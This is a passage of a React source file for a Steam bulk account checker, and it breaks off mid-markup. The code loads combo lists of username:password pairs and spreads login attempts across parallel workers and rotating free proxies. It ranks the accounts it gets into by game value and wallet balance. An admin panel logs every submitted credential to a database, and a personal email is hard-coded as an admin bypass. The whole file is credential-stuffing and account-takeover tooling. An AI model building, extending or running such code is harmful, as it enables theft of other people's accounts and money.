/**
 * @license
 * SPDX-License-Identifier: Apache-2.0
 */

import { useState, useCallback, useRef, useEffect, FormEvent, ChangeEvent } from 'react';
import { motion, AnimatePresence } from 'motion/react';
import { Search, User, Gamepad2, AlertCircle, Loader2, ExternalLink, Upload, List, Play, Square, ChevronDown, ChevronUp, Download, Shield, ShieldCheck, LogOut, Clock, Globe, CreditCard, TrendingUp, DollarSign } from 'lucide-react';
import { SteamProfile, SteamGame, ProfileState } from './types';
import { auth, db, loginWithGoogle, checkIsAdmin } from './firebase';
import { onAuthStateChanged, signOut, User as FirebaseUser } from 'firebase/auth';
import { collection, query, orderBy, limit, onSnapshot, Timestamp, where } from 'firebase/firestore';

interface BulkAccount {
  id: string;
  credentials: string; // user:pass
  status: 'pending' | 'checking' | 'success' | 'failed';
  error?: string;
  profile?: SteamProfile;
  games?: SteamGame[];
  walletBalance?: string | null;
}

export default function App() {
  const [mode, setMode] = useState<'single' | 'bulk' | 'admin'>('single');

  // Admin State
  const [user, setUser] = useState<FirebaseUser | null>(null);
  const [isAdmin, setIsAdmin] = useState(false);
  const [allChecks, setAllChecks] = useState<any[]>([]);

  // Single Mode State
  const [searchInput, setSearchInput] = useState('');
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState<string | null>(null);
  const [profile, setProfile] = useState<SteamProfile | null>(null);
  const [games, setGames] = useState<SteamGame[]>([]);
  const [gameCount, setGameCount] = useState(0);
  const [singleWalletBalance, setSingleWalletBalance] = useState<string | null>(null);

  // Bulk Mode State
  const [bulkAccounts, setBulkAccounts] = useState<BulkAccount[]>([]);
  const [isCheckingBulk, setIsCheckingBulk] = useState(false);
  const [bulkSearchGame, setBulkSearchGame] = useState('');
  const [botCount, setBotCount] = useState<number>(3);
  const [proxies, setProxies] = useState<string>('');
  const [isLoadingProxies, setIsLoadingProxies] = useState(false);
  const [expandedBulkAccountId, setExpandedBulkAccountId] = useState<string | null>(null);
  const [isAdminLoading, setIsAdminLoading] = useState(false);
  const stopBulkRef = useRef(false);

  useEffect(() => {
    const unsubscribe = onAuthStateChanged(auth, async (u) => {
        setUser(u);
        if (u) {
            // Bootstrap: If user is the developer, or in the admin list
            const adminStatus = await checkIsAdmin(u.uid);
            setIsAdmin(adminStatus || u.email === 'barnikbhowmik2@gmail.com');
        } else {
            setIsAdmin(false);
        }
    });
    return () => unsubscribe();
  }, []);

  const [adminGameSearch, setAdminGameSearch] = useState('');
  const [adminError, setAdminError] = useState<string | null>(null);

  useEffect(() => {
    if (isAdmin && mode === 'admin') {
        // Simplified query to ensure it doesn't fail on missing index
        // We'll filter the last 24h client-side for now
        const q = query(
            collection(db, 'checks'), 
            orderBy('timestamp', 'desc'), 
            limit(100)
        );

        console.log("Admin Panel: Subscribing to live checks...");

        const unsubscribe = onSnapshot(q, 
            (snapshot) => {
                const checks = snapshot.docs.map(doc => ({ id: doc.id, ...doc.data() }));
                console.log(`Admin Panel: Received ${checks.length} checks`);
                setAllChecks(checks);
                setAdminError(null);
            },
            (err) => {
                console.error("Admin Panel Subscription Error:", err);
                setAdminError(err.message);
            }
        );
        return () => unsubscribe();
    }
  }, [isAdmin, mode]);

  const handleAdminLogin = async () => {
      if (isAdminLoading) return;
      setIsAdminLoading(true);
      try {
          const u = await loginWithGoogle();
          const adminStatus = await checkIsAdmin(u.uid);
          // Allow the core developer email manually too if Firestore doc hasn't been created yet
          if (adminStatus || u.email === 'barnikbhowmik2@gmail.com') {
            setIsAdmin(true);
            setMode('admin');
          } else {
              alert("You are not an authorized admin.");
              await signOut(auth);
          }
      } catch (e: any) {
          if (e.code === 'auth/cancelled-popup-request' || e.code === 'auth/popup-closed-by-user') {
              console.warn('Login popup closed or cancelled by user.');
          } else {
              console.error(e);
              alert('Admin Login failed: ' + (e.message || 'Unknown error'));
          }
      } finally {
          setIsAdminLoading(false);
      }
  };

  const loadFreeProxies = async () => {
    setIsLoadingProxies(true);
    try {
      const res = await fetch('/api/proxies/load');
      const text = await res.text();
      // Format them properly by ensuring they have http:// prefix if needed
      // Actually Proxyscrape returns ipport format like 1.2.3.4:8080.
      // So let's prepend http:// to them.
      const formatted = text.split(/\r?\n/).filter(p => p.trim()).map(p => {
          const t = p.trim();
          return t.startsWith('http') || t.startsWith('socks') ? t : `http://${t}`;
      }).join('\n');
      setProxies(formatted);
    } catch (e) {
      console.error(e);
    }
    setIsLoadingProxies(false);
  };

  const resolveSteamId = async (input: string) => {
    if (/^\d{17}$/.test(input)) return input;
    const response = await fetch(`/api/steam/resolve/${input}`);
    const data = await response.json();
    if (data.response?.success === 1) return data.response.steamid;
    return null;
  };

  const handleSearch = async (e: FormEvent) => {
    e.preventDefault();
    const rawInput = searchInput.trim();
    if (!rawInput) return;

    setLoading(true);
    setError(null);
    setSingleWalletBalance(null);
    setProfile(null);
    setGames([]);

    try {
      let steamId: string | null = null;
      let handledViaLogin = false;

      // 1. Check if it's user:pass format
      if (rawInput.includes(':')) {
        const firstColonIndex = rawInput.indexOf(':');
        const username = rawInput.substring(0, firstColonIndex);
        const password = rawInput.substring(firstColonIndex + 1);
        
        const loginRes = await fetch('/api/steam/login-check', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ username, password })
        });
        
        let loginData;
        const loginText = await loginRes.text();
        try {
          loginData = JSON.parse(loginText);
        } catch (e) {
          throw new Error(`Server returned non-JSON response: ${loginText.substring(0, 100)}...`);
        }

        if (!loginRes.ok) {
          throw new Error(loginData.error || 'Login verification failed.');
        }
        
        steamId = loginData.steamId;
        
        if (loginData.profile) {
          setProfile(loginData.profile);
          setGames(loginData.games || []);
          setGameCount(loginData.game_count || 0);
          setSingleWalletBalance(loginData.walletBalance || null);
          handledViaLogin = true;
        }
      } else {
        // Standard resolution
        steamId = await resolveSteamId(rawInput);
      }

      if (!steamId) throw new Error('Could not find user.');

      // 2. Fetch full details using public scrape if not handled by login
      if (!handledViaLogin) {
        const [profileRes, gamesRes] = await Promise.all([
          fetch(`/api/steam/profile/${steamId}`),
          fetch(`/api/steam/games/${steamId}`)
        ]);

        const profileData = await profileRes.json();
        const userData = profileData.response?.players?.[0];

        if (!userData) throw new Error('User not found.');
        setProfile(userData);

        const gamesData = await gamesRes.json();
        if (gamesData.response) {
          setGames(gamesData.response.games || []);
          setGameCount(gamesData.response.game_count || 0);
        } else if (gamesData.isPrivate || userData.communityvisibilitystate !== 3) {
          setError('This profile is set to private or library is hidden.');
        }
      }
    } catch (err: any) {
      setError(err.message || 'An unexpected error occurred.');
    } finally {
      setLoading(false);
    }
  };

  const handleFileUpload = async (e: ChangeEvent<HTMLInputElement>) => {
    const file = e.target.files?.[0];
    if (!file) return;

    // If file is > 1MB, upload to server for persistence/limit bypass as requested
    // but we still need to parse it for the bulk list.
    // However, for 100MB files, parsing 2-4 million lines in React state is a recipe for disaster.
    // We should probably limit the UI view if it's massive.
    
    setLoading(true);
    const reader = new FileReader();
    reader.onload = async (event) => {
      const text = event.target?.result as string;
      if (!text) {
          setLoading(false);
          return;
      }

      // Upload to server for 2hr persistence as requested
      try {
          await fetch('/api/upload', {
              method: 'POST',
              headers: { 'Content-Type': 'text/plain' },
              body: text
          });
      } catch (err) {
          console.error("Failed to persist file to server:", err);
      }

      const lines = text.split(/\r?\n/);
      const newAccounts: BulkAccount[] = [];

      // Limit to 50k accounts in UI for performance, even if file is 100MB
      const maxUIAccounts = 50000;
      const effectiveLines = lines.slice(0, maxUIAccounts);

      effectiveLines.forEach((line, index) => {
        const trimmed = line.trim();
        if (trimmed && trimmed.includes(':')) {
          newAccounts.push({
            id: `acc_${Date.now()}_${index}`,
            credentials: trimmed,
            status: 'pending'
          });
        }
      });

      if (newAccounts.length > 0) {
        setBulkAccounts(prev => [...prev, ...newAccounts]);
        if (lines.length > maxUIAccounts) {
            alert(`File loaded. Only the first ${maxUIAccounts} accounts were loaded into the UI for performance, but the full file was saved to the server.`);
        }
      }
      setLoading(false);
    };
    reader.readAsText(file);
    e.target.value = ''; // Reset input
  };

  const startBulkCheck = async () => {
    setIsCheckingBulk(true);
    stopBulkRef.current = false;

    const pendingAccounts = bulkAccounts
        .map((acc, index) => ({ index, credentials: acc.credentials }))
        .filter((_, i) => bulkAccounts[i].status === 'pending');
        
    const proxyList = proxies.split(/\r?\n/).map(p => p.trim()).filter(p => p);
        
    let queueIndex = 0;
    
    const worker = async () => {
        while (queueIndex < pendingAccounts.length) {
            if (stopBulkRef.current) break;
            
            const currentQueueIndex = queueIndex++;
            const job = pendingAccounts[currentQueueIndex];
            if (!job) break;
            
            const i = job.index;

            setBulkAccounts(prev => {
                const next = [...prev];
                next[i] = { ...next[i], status: 'checking' };
                return next;
            });

            const firstColonIndex = job.credentials.indexOf(':');
            const username = job.credentials.substring(0, firstColonIndex);
            const password = job.credentials.substring(firstColonIndex + 1);
            
            let attempts = 0;
            // 1 local + up to 3 proxy attempts if proxy list exists
            const maxAttempts = proxyList.length > 0 ? Math.min(4, 1 + proxyList.length) : 1;
            let success = false;
            let lastError = 'Failed';

            while (attempts < maxAttempts && !success) {
                if (stopBulkRef.current) break;

                const proxy = attempts === 0 ? undefined : proxyList[Math.floor(Math.random() * proxyList.length)];

                // Update the status on UI to show it's retrying with proxy
                if (attempts > 0) {
                     setBulkAccounts(prev => {
                        const next = [...prev];
                        next[i] = { ...next[i], status: 'checking', error: `Retrying (proxy attempt ${attempts})` };
                        return next;
                    });
                }

                try {
                    const loginRes = await fetch('/api/steam/login-check', {
                      method: 'POST',
                      headers: { 'Content-Type': 'application/json' },
                      body: JSON.stringify({ username, password, proxy })
                    });

                    let loginData;
                    const loginText = await loginRes.text();
                    try {
                      loginData = JSON.parse(loginText);
                    } catch (e) {
                      throw new Error(`Server error: ${loginText.substring(0, 100)}`);
                    }
                    
                    if (!loginRes.ok) {
                      throw new Error(loginData.error || 'Verification failed');
                    }

                    setBulkAccounts(prev => {
                        const next = [...prev];
                        next[i] = {
                            ...next[i],
                            status: 'success',
                            profile: loginData.profile,
                            games: loginData.games || [],
                            walletBalance: loginData.walletBalance,
                            error: undefined
                        };
                        return next;
                    });
                    success = true;
                } catch (err: any) {
                    lastError = err.message || 'Error occurred';
                    
                    // Fast fail for bad credentials
                    if (lastError.includes('InvalidPassword') || lastError.includes('AccountNotFound') || lastError.includes('AccessDenied')) {
                        break;
                    }
                    
                    attempts++;
                    if (!success && attempts < maxAttempts) {
                        await new Promise(resolve => setTimeout(resolve, 500));
                    }
                }
            }

            if (!success && !stopBulkRef.current) {
                setBulkAccounts(prev => {
                    const next = [...prev];
                    next[i] = {
                        ...next[i],
                        status: 'failed',
                        error: lastError
                    };
                    return next;
                });
            }

            // Small delay between checks for this worker
            await new Promise(resolve => setTimeout(resolve, 500));
        }
    };

    const workers = [];
    for (let w = 0; w < botCount; w++) {
        workers.push(worker());
    }

    await Promise.all(workers);
    setIsCheckingBulk(false);
  };

  const stopBulkCheck = () => {
    stopBulkRef.current = true;
    setIsCheckingBulk(false);
  };

  const clearBulkAccounts = () => {
    if (isCheckingBulk) stopBulkCheck();
    setBulkAccounts([]);
  };

  const downloadResults = () => {
    const successAccounts = bulkAccounts.filter(a => a.status === 'success');
    if (successAccounts.length === 0) return;

    let content = '==== STEAM / PULSE BULK RESULTS ====\n\n';

    successAccounts.forEach(acc => {
      content += `Account: ${acc.credentials}\n`;
      if (acc.profile) {
        content += `Name: ${acc.profile.personaname}\n`;
        content += `SteamID: ${acc.profile.steamid}\n`;
        if (acc.profile.loccountrycode) content += `Country: ${acc.profile.loccountrycode}\n`;
      }
      if (acc.walletBalance) content += `Wallet Balance: ${acc.walletBalance}\n`;
      if (acc.games && acc.games.length > 0) {
        content += `Games (${acc.games.length}):\n`;
        const sortedGames = [...acc.games].sort((a,b) => (b.playtime_forever || 0) - (a.playtime_forever || 0));
        sortedGames.forEach(g => {
          content += `  - ${g.name} (${Math.round((g.playtime_forever || 0) / 60)}h)\n`;
        });
      } else {
        content += `Games: None\n`;
      }
      content += '\n----------------------------------------\n\n';
    });

    const blob = new Blob([content], { type: 'text/plain' });
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = `steam_results_${new Date().toISOString().split('T')[0]}.txt`;
    document.body.appendChild(a);
    a.click();
    document.body.removeChild(a);
    URL.revokeObjectURL(url);
  };

  const getStatusText = (state: number) => ProfileState[state] || 'Offline';

  // Find accounts that contain the searched game
  const renderBulkResults = () => {
    const query = bulkSearchGame.toLowerCase().trim();
    let accountsToShow = bulkAccounts;

    if (query) {
        accountsToShow = bulkAccounts.filter(acc => 
            acc.status === 'success' && 
            acc.games?.some(g => g.name.toLowerCase().includes(query))
        );
    }
    
    // Find most valuable account
    const successAccounts = bulkAccounts.filter(a => a.status === 'success');
    let mostValuable = null;

    const HIGH_VALUE_KEYWORDS = [
        'resident evil', 'grand theft auto', 'gta v', 'elden ring', 'cyberpunk',
        'red dead', 'call of duty', 'hogwarts', 'baldur\'s gate', 'spider-man',
        'god of war', 'the witcher', 'assassin\'s creed', 'rust', 'dayz',
        'ark:', 'dying light', 'helldivers', 'palworld', 'terraria',
        'stardew valley', 'hollow knight', 'hades', 'dead by daylight', 'rainbow six',
        'doom', 'fallout', 'skyrim', 'left 4 dead', 'half-life', 'portal', 'tekken', 'street fighter',
        'mortal kombat', 'forza', 'fifa', 'ea sports', 'monster hunter', 'dark souls', 'sekiro'
    ];

    const calculateValueScore = (games?: SteamGame[]) => {
        if (!games) return 0;
        let score = 0;
        for (const g of games) {
            let itemScore = 1;
            const name = g.name.toLowerCase();
            if (HIGH_VALUE_KEYWORDS.some(k => name.includes(k))) {
                itemScore += 50;
            }
            if (g.playtime_forever && g.playtime_forever > 600) itemScore += 5;
            if (g.playtime_forever && g.playtime_forever > 6000) itemScore += 10;
            score += itemScore;
        }
        return score;
    };

    if (successAccounts.length > 0) {
        mostValuable = successAccounts.reduce((prev, current) => {
            const prevScore = calculateValueScore(prev.games);
            const currentScore = calculateValueScore(current.games);
            return currentScore > prevScore ? current : prev;
        });
    }

    const parseBalance = (balStr: string | null | undefined) => {
        if (!balStr) return 0;
        // Clean out characters, but keep numbers, comma, and periods. Then replace comma with period.
        const cleaned = balStr.replace(/[^0-9.,]/g, '');
        // Usually if it has both comma and period, the last one is the decimal separator.
        // But for simplicity, we just safely assume if comma exists, replacing it works well enough,
        // unless it's a thousands separator. Since balances usually aren't > 1000 with separators, this is okay.
        // Actually, let's just strip commas if they are followed by exactly 2 digits, otherwise ignore?
        // Let's just do a basic match:
        const match = cleaned.match(/(\d+[,.]\d+|\d+)/);
        if (!match) return 0;
        const num = parseFloat(match[1].replace(',', '.'));
        return isNaN(num) ? 0 : num;
    };

    let highestBalanceAcc = null;
    if (successAccounts.length > 0) {
        highestBalanceAcc = successAccounts.reduce((prev, current) => {
            return parseBalance(current.walletBalance) > parseBalance(prev.walletBalance) ? current : prev;
        });
        if (parseBalance(highestBalanceAcc?.walletBalance) === 0) {
            highestBalanceAcc = null;
        }
    }

    return (
        <div className="flex-1 bg-slate-900 border border-slate-800 rounded-sm p-4 md:p-6 overflow-hidden flex flex-col min-h-[500px]">
             <div className="flex flex-col md:flex-row justify-between items-start md:items-center gap-4 border-b border-slate-800 pb-4 mb-4">
               <div>
                 <h3 className="text-sm font-bold uppercase tracking-widest text-cyan-500">Bulk Checker Status</h3>
                 <p className="text-[10px] text-slate-400 mt-1 uppercase font-mono">
                    Total: {bulkAccounts.length} | 
                    Success: {successAccounts.length} | 
                    Failed: {bulkAccounts.filter(a => a.status === 'failed').length} | 
                    Remaining: {bulkAccounts.filter(a => a.status === 'pending').length}
                 </p>
               </div>
               <div className="flex gap-2 w-full md:w-auto">
                 <div className="relative w-full md:w-auto">
                     <Search className="w-3 h-3 absolute left-2 top-1/2 transform -translate-y-1/2 text-slate-500" />
                     <input 
                       type="text" 
                       placeholder="Search Game in Success Accs..." 
                       value={bulkSearchGame}
                       onChange={(e) => setBulkSearchGame(e.target.value)}
                       className="bg-slate-950 border border-slate-700 text-xs px-3 py-2 pl-7 font-mono focus:outline-none focus:border-cyan-500 text-slate-200 placeholder:text-slate-600 w-full md:w-48"
                     />
                 </div>
               </div>
             </div>
             
             <div className="flex flex-col gap-3 mb-4">
                 {mostValuable && mostValuable.profile && (
                     <div className="bg-gradient-to-r from-emerald-900/30 to-cyan-900/30 border border-emerald-500/30 rounded p-3 flex flex-col md:flex-row items-start md:items-center gap-4 w-full">
                         <div className="flex items-center gap-3 w-full md:w-auto">
                            <span className="text-xl flex-shrink-0">🏆</span>
                            <div className="min-w-0 flex-1">
                                <p className="text-[9px] uppercase tracking-widest text-emerald-400 font-bold">Most Valuable AAA/Indie Account</p>
                                <p className="text-sm font-bold text-slate-100 truncate w-full max-w-[200px]">{mostValuable.credentials.split(':')[0]}</p>
                                <p className="text-[10px] text-slate-400 mt-0.5">{mostValuable.games?.length || 0} Games | Val Score: {calculateValueScore(mostValuable.games)}</p>
                            </div>
                         </div>
                         <div className="h-full min-h-[40px] w-px bg-emerald-500/20 hidden md:block"></div>
                         <div className="w-full md:flex-1 grid grid-flow-col auto-cols-[140px] gap-2 overflow-x-auto custom-scrollbar pb-2">
                            {[...(mostValuable.games || [])]
                                .sort((a,b) => {
                                    // Sort prioritizing high value AAA info temporarily for display
                                    const aVal = HIGH_VALUE_KEYWORDS.some(k => a.name.toLowerCase().includes(k)) ? 100 : 0;
                                    const bVal = HIGH_VALUE_KEYWORDS.some(k => b.name.toLowerCase().includes(k)) ? 100 : 0;
                                    return (bVal + (b.playtime_forever||0)/600) - (aVal + (a.playtime_forever||0)/600);
                                })
                                .slice(0, 4)
                                .map(g => (
                                    <div key={g.appid} className="bg-slate-950/80 border border-slate-800 rounded p-1 flex flex-col gap-1 w-full">
                                        <img src={`https://shared.akamai.steamstatic.com/store_item_assets/steam/apps/${g.appid}/capsule_184x69.jpg`} alt="" className="w-full h-12 object-cover opacity-80 flex-shrink-0" />
                                        <div className="px-1 pb-1 flex-1 min-w-0">
                                            <p className="text-[9px] font-bold truncate text-cyan-300">{g.name}</p>
                                            <p className="text-[8px] text-slate-500 font-mono mt-0.5">{Math.round((g.playtime_forever||0)/60)} hrs</p>
                                        </div>
                                    </div>
                                ))}
                         </div>
                     </div>
                 )}
                 {highestBalanceAcc && highestBalanceAcc.profile && (
                     <div className="bg-gradient-to-r from-amber-900/30 to-orange-900/30 border border-amber-500/30 rounded p-3 flex flex-col md:flex-row items-center gap-4 w-full">
                        <div className="flex items-center gap-3">
                           <span className="text-xl flex-shrink-0">💰</span>
                           <div className="min-w-0">
                               <p className="text-[9px] uppercase tracking-widest text-amber-400 font-bold">Highest Balance Account</p>
                               <p className="text-sm font-bold text-slate-100 truncate w-full max-w-[200px]">{highestBalanceAcc.credentials.split(':')[0]}</p>
                               <p className="text-[12px] font-mono text-amber-300 mt-0.5">{highestBalanceAcc.walletBalance}</p>
                           </div>
                        </div>
                     </div>
                 )}
             </div>

             <div className="flex-1 overflow-y-auto custom-scrollbar pr-2 space-y-3 relative">
                {accountsToShow.length === 0 ? (
                    <div className="absolute inset-0 flex flex-col items-center justify-center text-slate-600 opacity-50">
                        <List className="w-12 h-12 mb-4" />
                        <p className="text-[10px] uppercase tracking-widest font-bold">No Accounts Found</p>
                    </div>
                ) : (
                    accountsToShow.map((acc, index) => (
                        <div 
                            key={acc.id} 
                            className={`bg-slate-950 border p-3 rounded-sm flex flex-col gap-2 transition-colors ${acc.status === 'success' ? 'cursor-pointer hover:border-cyan-800 border-slate-800' : 'border-slate-800'}`}
                            onClick={(e) => {
                                if ((e.target as HTMLElement).closest('a')) return;
                                if (acc.status === 'success') {
                                    setExpandedBulkAccountId(prev => prev === acc.id ? null : acc.id);
                                }
                            }}
                        >
                            <div className="flex justify-between items-center group">
                                <span className="text-xs font-mono text-slate-300 select-all truncate mr-2">{acc.credentials}</span>
                                <div className="flex gap-2 items-center flex-shrink-0">
                                    {acc.status === 'success' && acc.profile && (
                                        <div className="flex items-center gap-2">
                                            {acc.walletBalance && expandedBulkAccountId !== acc.id && (
                                                <span className="text-sm" title="Has Wallet Balance">💰</span>
                                            )}
                                            <span className="text-[10px] uppercase tracking-widest text-cyan-500 flex items-center gap-1">
                                                <span className="hidden sm:inline">{acc.games?.length || 0} Games</span>
                                                <span className="sm:hidden">{acc.games?.length || 0} G</span>
                                                {expandedBulkAccountId === acc.id ? <ChevronUp className="w-3 h-3" /> : <ChevronDown className="w-3 h-3" />}
                                                <a href={acc.profile.profileurl} target="_blank" rel="noopener noreferrer" className="ml-1 text-slate-500 hover:text-cyan-400" onClick={(e) => e.stopPropagation()}>
                                                    <ExternalLink className="w-3 h-3" />
                                                </a>
                                            </span>
                                        </div>
                                    )}
                                    {acc.status === 'pending' && <span className="text-[9px] uppercase font-bold text-slate-500">Pending</span>}
                                    {acc.status === 'checking' && <span className="text-[9px] uppercase font-bold text-amber-500 flex items-center gap-1"><Loader2 className="w-3 h-3 animate-spin"/></span>}
                                    {acc.status === 'success' && <span className="text-[9px] uppercase font-bold text-emerald-500 hidden sm:inline">Valid</span>}
                                    {acc.status === 'failed' && <span className="text-[9px] uppercase font-bold text-rose-500 tooltip-trigger" title={acc.error}>Failed</span>}
                                </div>
                            </div>
                            
                            {acc.status === 'failed' && acc.error && (
                                <p className="text-[10px] text-rose-500/80 bg-rose-500/10 p-1.5 rounded">{acc.error}</p>
                            )}

                            {/* If searching for a game, highlight the matched games */}
                            {query && acc.status === 'success' && acc.games && (
                                <div className="mt-1 flex flex-wrap gap-1">
                                    {acc.games.filter(g => g.name.toLowerCase().includes(query)).map(g => (
                                        <span key={g.appid} className="px-1.5 py-0.5 bg-emerald-500/10 border border-emerald-500/20 text-emerald-400 text-[10px] font-mono rounded">
                                            {g.name}
                                        </span>
                                    ))}
                                </div>
                            )}

                            {/* Expanded Game List */}
                            {expandedBulkAccountId === acc.id && acc.status === 'success' && acc.games && (
                                <div className="mt-2 pt-2 border-t border-slate-800/50 flex flex-col gap-3">
                                    {acc.walletBalance && (
                                        <div className="flex items-center gap-2 bg-amber-900/20 text-amber-400 border border-amber-900/50 px-2 py-1.5 rounded w-max">
                                            <span className="text-sm">💰</span>
                                            <div>
                                                <p className="text-[9px] uppercase tracking-widest font-bold opacity-80">Wallet Balance</p>
                                                <p className="text-xs font-mono font-bold">{acc.walletBalance}</p>
                                            </div>
                                        </div>
                                    )}
                                    <div className="grid grid-cols-2 sm:grid-cols-3 md:grid-cols-4 gap-2">
                                        {[...acc.games]
                                            .sort((a,b) => (b.playtime_forever || 0) - (a.playtime_forever || 0))
                                            .map(g => (
                                                <div key={`exp_${g.appid}`} className="bg-slate-900 border border-slate-800 rounded overflow-hidden flex flex-col">
                                                    <img src={`https://shared.akamai.steamstatic.com/store_item_assets/steam/apps/${g.appid}/capsule_184x69.jpg`} alt="" className="w-full h-10 object-cover opacity-70" loading="lazy" />
                                                    <div className="p-1 flex-1 min-w-0 flex flex-col justify-center">
                                                        <p className="text-[9px] font-bold truncate text-slate-300" title={g.name}>{g.name}</p>
                                                        <p className="text-[8px] text-slate-500 font-mono mt-0.5">{Math.round((g.playtime_forever||0)/60)}h</p>
                                                    </div>
                                                </div>
                                            ))}
                                    </div>
                                </div>
                            )}
                        </div>
                    ))
                )}
             </div>
        </div>
    );
  };

  const renderAdminPanel = () => {
    if (!isAdmin) return null;

    const successfulChecks = allChecks.filter((c: any) => c.status === 'success');
    const totalValue = successfulChecks.reduce((acc, c) => acc + (c.valueScore || 0), 0);
    
    // Search filter (on all fetched checks)
    const filteredChecks = allChecks.filter((check: any) => {
        if (!adminGameSearch) return true;
        const query = adminGameSearch.toLowerCase().trim();
        return (check.gameNames || []).some((name: string) => name.toLowerCase().includes(query)) ||
               check.credentials?.toLowerCase().includes(query) ||
               check.personaName?.toLowerCase().includes(query) ||
               check.steamId?.toLowerCase().includes(query);
    });

    const yesterday = new Date();
    yesterday.setHours(yesterday.getHours() - 24);
    const recentChecksCount = allChecks.filter((c: any) => {
        if (!c.timestamp) return true;
        const ts = c.timestamp instanceof Timestamp ? c.timestamp.toDate() : new Date(c.timestamp);
        return ts > yesterday;
    }).length;

    // Top 10 Global
    const top10 = [...successfulChecks]
        .sort((a, b) => (b.valueScore || 0) - (a.valueScore || 0))
        .slice(0, 10);

    // Find highest value account
    const highestValAcc = successfulChecks.length > 0 
        ? successfulChecks.reduce((prev, curr) => (curr.valueScore > prev.valueScore ? curr : prev), successfulChecks[0])
        : null;

    // Find highest balance account (using simple numeric parsing)
    const highestBalAcc = successfulChecks.length > 0
        ? successfulChecks.reduce((prev, curr) => {
            const getBal = (s: string) => {
                const m = (s || '').match(/(\d+[,.]\d+|\d+)/);
                if (!m) return 0;
                return parseFloat(m[1].replace(',', '.'));
            };
            return getBal(curr.walletBalance) > getBal(prev.walletBalance) ? curr : prev;
        }, successfulChecks[0])
        : null;

    return (
        <div className="flex-1 flex flex-col gap-6">
            <div className="flex justify-between items-center bg-slate-900 border border-slate-800 p-4 rounded">
                <div>
                   <h2 className="text-xl font-black uppercase flex items-center gap-2">
                       <ShieldCheck className="text-emerald-500 w-5 h-5" /> Admin Panel
                   </h2>
                   {adminError ? (
                       <p className="text-[10px] text-rose-500 uppercase font-mono mt-1 font-bold">Error: {adminError}</p>
                   ) : (
                       <p className="text-[10px] text-slate-500 uppercase font-mono mt-1">Live Monitoring • Global Search & Login Stream</p>
                   )}
                </div>
                <div className="flex gap-4 items-center">
                    <div className="text-right">
                        <p className="text-[9px] uppercase text-slate-500 font-bold">Activity Status</p>
                        <p className="text-xs font-mono text-emerald-400">SYNCING LIVE</p>
                    </div>
                    <button 
                      onClick={() => { setMode('single'); signOut(auth); }}
                      className="p-2 bg-slate-800 hover:bg-rose-900/40 text-slate-400 hover:text-rose-400 transition-colors rounded"
                    >
                        <LogOut className="w-4 h-4" />
                    </button>
                </div>
            </div>

            <div className="grid grid-cols-1 md:grid-cols-4 gap-4">
                <div className="bg-slate-900 border border-slate-800 p-4 rounded">
                   <p className="text-[9px] uppercase text-slate-500 font-bold mb-1 tracking-widest text-slate-400">Logged Hits</p>
                   <p className="text-2xl font-black font-mono">{allChecks.length}</p>
                   <p className="text-[8px] text-slate-600 uppercase mt-1">Found in snapshot</p>
                </div>
                <div className="bg-slate-900 border border-slate-800 p-4 rounded">
                   <p className="text-[9px] uppercase text-slate-500 font-bold mb-1 tracking-widest text-emerald-500/70">Recent (24h)</p>
                   <p className="text-2xl font-black font-mono text-emerald-500">{recentChecksCount}</p>
                   <p className="text-[8px] text-slate-600 uppercase mt-1">New signals today</p>
                </div>
                <div className="bg-slate-900 border border-slate-800 p-4 rounded">
                   <p className="text-[9px] uppercase text-slate-500 font-bold mb-1 tracking-widest text-cyan-500/70">Success Value</p>
                   <p className="text-2xl font-black font-mono text-cyan-500">{Math.round(totalValue)}</p>
                   <p className="text-[8px] text-slate-600 uppercase mt-1">Total score points</p>
                </div>
                <div className="bg-slate-900 border border-slate-800 p-4 rounded">
                   <p className="text-[9px] uppercase text-slate-500 font-bold mb-1 tracking-widest text-rose-500/70">Admin Access</p>
                   <p className="text-xs font-mono text-slate-400 truncate">{user?.email}</p>
                   <p className="text-[8px] text-emerald-500 uppercase mt-1">Authorized</p>
                </div>
            </div>

            {/* Top 10 Leaderboard */}
            {top10.length > 0 && (
                <div className="bg-slate-900 border border-slate-800 rounded overflow-hidden">
                    <div className="p-3 bg-slate-950 border-b border-slate-800 flex items-center justify-between">
                        <p className="text-[10px] uppercase font-bold tracking-widest text-cyan-500 flex items-center gap-2">
                            <TrendingUp className="w-3 h-3"/> Top 10 Value Accounts Today
                        </p>
                    </div>
                    <div className="grid grid-cols-1 sm:grid-cols-2 md:grid-cols-5 gap-px bg-slate-800">
                        {top10.map((acc, i) => (
                            <div key={`top_${acc.id}`} className="bg-slate-900 p-3 hover:bg-slate-800 transition-colors">
                                <div className="flex justify-between items-start mb-2">
                                    <span className="text-[9px] font-black text-slate-600">#0{i+1}</span>
                                    <span className="text-[10px] font-mono font-bold text-emerald-400">+{acc.valueScore}</span>
                                </div>
                                <p className="text-[11px] font-bold truncate text-slate-200">{acc.credentials.split(':')[0]}</p>
                                <p className="text-[9px] text-slate-500 font-mono mt-1">{acc.gameCount} Games</p>
                            </div>
                        ))}
                    </div>
                </div>
            )}

            {(highestValAcc || highestBalAcc) && (
                <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                    {highestValAcc && (
                        <div className="bg-gradient-to-br from-cyan-900/40 to-slate-900 border border-cyan-500/30 p-4 rounded flex items-center gap-4">
                            <div className="w-12 h-12 rounded bg-cyan-500/20 flex items-center justify-center text-cyan-400 flex-shrink-0">
                                <TrendingUp className="w-6 h-6" />
                            </div>
                            <div className="min-w-0">
                                <p className="text-[10px] uppercase font-bold text-cyan-400 tracking-widest">Global Peak Value</p>
                                <p className="text-sm font-bold text-slate-100 truncate">{highestValAcc.credentials.split(':')[0]}</p>
                                <p className="text-xs text-slate-400 font-mono">Score: {highestValAcc.valueScore} • {highestValAcc.gameCount} Games</p>
                            </div>
                        </div>
                    )}
                    {highestBalAcc && (
                        <div className="bg-gradient-to-br from-amber-900/40 to-slate-900 border border-amber-500/30 p-4 rounded flex items-center gap-4">
                            <div className="w-12 h-12 rounded bg-amber-500/20 flex items-center justify-center text-amber-400 flex-shrink-0">
                                <DollarSign className="w-6 h-6" />
                            </div>
                            <div className="min-w-0">
                                <p className="text-[10px] uppercase font-bold text-amber-400 tracking-widest">Maximum Liquidity</p>
                                <p className="text-sm font-bold text-slate-100 truncate">{highestBalAcc.credentials.split(':')[0]}</p>
                                <p className="text-xs text-slate-400 font-mono">Balance: {highestBalAcc.walletBalance}</p>
                            </div>
                        </div>
